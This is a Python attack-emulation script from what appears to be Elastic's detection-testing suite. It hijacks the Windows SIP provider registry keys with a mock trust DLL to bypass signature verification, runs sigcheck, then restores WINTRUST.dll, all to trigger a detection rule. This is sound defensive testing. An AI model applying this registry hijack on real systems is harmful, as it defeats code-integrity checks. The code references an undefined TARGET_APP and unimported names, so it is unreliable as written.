# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: SIP Provider Modification
# RTA: sip_provider.py
# ATT&CK: TBD
# Description: Registers a mock SIP provider to bypass code integrity checks and execute mock malware.

from . import _common


CRYPTO_ROOT = "SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0"
VERIFY_DLL_KEY = "%s\\CryptSIPDllVerifyIndirectData\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" % CRYPTO_ROOT
GETSIG_KEY = "%s\\CryptSIPDllGetSignedDataMsg\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" % CRYPTO_ROOT


def register_sip_provider(dll_path, verify_function, getsig_function):
    winreg = _common.get_winreg()
    hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, VERIFY_DLL_KEY)

    _common.log("Setting verify dll path: %s" % dll_path)
    winreg.SetValueEx(hkey, "Dll", 0, winreg.REG_SZ, dll_path)

    _common.log("Setting verify function name: %s" % verify_function)
    winreg.SetValueEx(hkey, "FuncName", 0, winreg.REG_SZ, verify_function)

    hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, GETSIG_KEY)

    _common.log("Setting getsig dll path: %s" % dll_path)
    winreg.SetValueEx(hkey, "Dll", 0, winreg.REG_SZ, dll_path)

    _common.log("Setting getsig function name: %s" % getsig_function)
    winreg.SetValueEx(hkey, "FuncName", 0, winreg.REG_SZ, getsig_function)


if _common.is_64bit():
    SIGCHECK_EXE = "bin/sigcheck64.exe"
    TRUST_PROVIDER_DLL = "bin/TrustProvider64.dll"
else:
    SIGCHECK_EXE = "bin/sigcheck32.exe"
    TRUST_PROVIDER_DLL = "bin/TrustProvider32.dll"

TARGET_APP_EXE = "bin/myapp.exe"


@register_code_rta(
    id="b0e3e1bb-dfa5-473a-8862-b2d1d42819ce",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[],
    siem_rules=[RuleMetadata(id="f2c7b914-eda3-40c2-96ac-d23ef91776ca", name="SIP Provider Modification")],
    techniques=["T1553"],
    ancillary_files=[SIGCHECK_EXE, TRUST_PROVIDER_DLL, TARGET_APP_EXE],
)
def main():
    _common.log("Registering SIP provider")
    register_sip_provider(TRUST_PROVIDER_DLL, "VerifyFunction", "GetSignature")

    _common.log("Launching sigcheck")
    _common.execute([SIGCHECK_EXE, "-accepteula", TARGET_APP])

    _common.log("Cleaning up", log_type="-")
    wintrust = "C:\\Windows\\System32\\WINTRUST.dll"
    register_sip_provider(wintrust, "CryptSIPVerifyIndirectData", "CryptSIPGetSignedDataMsg")
